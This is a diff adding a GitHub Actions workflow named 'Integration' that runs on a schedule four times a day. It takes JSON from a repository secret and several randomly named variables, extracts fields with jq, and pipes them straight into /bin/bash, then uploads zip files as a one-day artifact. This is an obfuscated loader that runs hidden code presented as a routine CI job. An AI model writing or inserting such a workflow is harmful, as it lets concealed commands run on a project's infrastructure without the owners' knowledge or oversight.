@@ -1,0 +1,28 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '41 0,6,12,18 * * *'
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          h56: ${{ secrets.h56 }}
+        run: |
+          printf '%s' "$h56" | jq -r .s6563 | /bin/bash
+          echo $zbne225 | jq -r .cc2866 | /bin/bash
+          printf '%s' "$wkl45" | jq -r .ydy3318 | /bin/bash
+          printf '%s' "$bahma39" | jq -r .b651 | /bin/bash
+          printf '%s' "$bx751" | jq -r .bqni919 | /bin/bash
+          echo $o8 | jq -r .svi46 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: uHRKrDEE
+          path: "*.zip"
+          retention-days: 1
